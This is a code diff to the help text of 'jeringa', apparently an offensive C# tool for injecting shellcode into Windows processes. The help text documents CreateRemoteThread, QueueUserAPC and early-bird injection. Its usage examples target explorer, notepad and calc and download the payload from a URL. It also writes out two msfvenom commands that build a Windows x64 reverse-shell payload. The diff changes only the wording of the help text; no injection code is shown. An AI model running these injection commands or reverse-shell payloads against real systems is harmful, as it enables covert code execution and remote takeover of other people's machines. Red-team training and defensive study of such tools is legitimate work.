@@ -384,39 +384,45 @@ namespace jeringa
 
         static void getHelp()
         {
+            Console.WriteLine("    _           _                   \r\n   (_)         (_)                  \r\n    _  ___ _ __ _ _ __   __ _  __ _ \r\n   | |/ _ \\ '__| | '_ \\ / _` |/ _` |\r\n   | |  __/ |  | | | | | (_| | (_| |\r\n   | |\\___|_|  |_|_| |_|\\__, |\\__,_|\r\n  _/ |                   __/ |      \r\n |__/                   |___/     \n\n");
+
             Console.WriteLine("[+] Option \"list\" to  enumerate all processes or filter by name or owner.\n");
-            Console.WriteLine("[*] List all processes:");
+            Console.WriteLine("jeringa.exe list [ all | PROCESS_NAME | PROCESS_OWNER]\r\n");
+            Console.WriteLine("[*] Example - List all processes:");
             Console.WriteLine("jeringa.exe list all");
-            Console.WriteLine("[*] List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
-            Console.WriteLine("jeringa.exe list explorer");
-            Console.WriteLine("jeringa.exe list \"DESKTOP-MA54241\\ricardo\"");
-            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
+            Console.WriteLine("[*] Example - List processes with a specific name (\"explorer\") or process owner (\"DESKTOP-MA54241\\ricardo\"):");
+            Console.WriteLine("jeringa.exe list explorer\r\njeringa.exe list \"DESKTOP-MA54241\\ricardo\"");
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
-            Console.WriteLine("[+] Injection \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread) \n[+] You can use the process PID or the name and owner; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
-            Console.WriteLine("[*] Injection using process name, process owner and payload in HEX format:");
-            Console.WriteLine("jeringa.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]");
-            Console.WriteLine("[*] Injection using PID (\"1234\") and a url to download the payload:");
+            Console.WriteLine("[+] Injection \"inject-crt\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)\n");
+            Console.WriteLine("jeringa.exe inject-crt [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
+            Console.WriteLine("jeringa.exe inject-crt explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
+            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
             Console.WriteLine("jeringa.exe inject-crt 1234 http://127.0.0.1/payload.bin");
-            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
-            Console.WriteLine("[+] Injection \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC) \n[+] You can use the process PID or the name and owner; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
-            Console.WriteLine("[*] Injection using process name, process owner and payload in HEX format:");
-            Console.WriteLine("jeringa.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" [ fc4883e4f0e8... ]");
-            Console.WriteLine("[*] Injection using PID (\"1234\") and a url to download the payload:");
+            Console.WriteLine("[+] Injection \"inject-apc\" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)\n");
+            Console.WriteLine("jeringa.exe inject-apc [(PROCESS_NAME PROCESS_OWNER) | PROCESS_PID] [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("[*] Example - Injection using process name, process owner and payload in HEX format:");
+            Console.WriteLine("jeringa.exe inject-apc explorer \"DESKTOP-MA54241\\ricardo\" fc4883e4f0e8...");
+            Console.WriteLine("[*] Example - Injection using PID (\"1234\") and a url to download the payload:");
             Console.WriteLine("jeringa.exe inject-apc 1234 http://127.0.0.1/payload.bin");
-            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
-            Console.WriteLine("[+] Injection \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread) \n[+] You set the program path; the payload can be in HEX format or a url to download it, or the program asks for a value.\n");
-            Console.WriteLine("[*] Injection using program path and payload in HEX format:");
-            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\notepad.exe\" [ fc4883e4f0e8... ]");
-            Console.WriteLine("[*] Injection using program path and a url to download the payload:");
+            Console.WriteLine("[+] Injection \"earlybird\" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)\n");
+            Console.WriteLine("jeringa.exe earlybird PROGRAM_PATH [ HEX_PAYLOAD | URL]\r\n");
+            Console.WriteLine("[*] Example - Injection using program path and payload in HEX format:");
+            Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\notepad.exe\" fc4883e4f0e8...");
+            Console.WriteLine("[*] Example - Injection using program path and a url to download the payload:");
             Console.WriteLine("jeringa.exe earlybird \"c:\\windows\\system32\\calc.exe\" http://127.0.0.1/payload.bin");
-            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 150)));
+            Console.WriteLine(string.Concat(Enumerable.Repeat("-", 100)));
 
+            Console.WriteLine("[+] Payload generation\n");
             Console.WriteLine("[*] Create payload in HEX format using Msfvenom with:");
-            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'\n");
+            Console.WriteLine("Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c EXITFUNC=thread | grep '\\x' | tr -d '\"\\n\\\\x;'");
             Console.WriteLine("[*] Create payload in raw format for url option using Msfvenom with:");
-            Console.WriteLine("msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
+            Console.WriteLine("Example - msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f bin > payload.bin");
 
             System.Environment.Exit(0);
         }
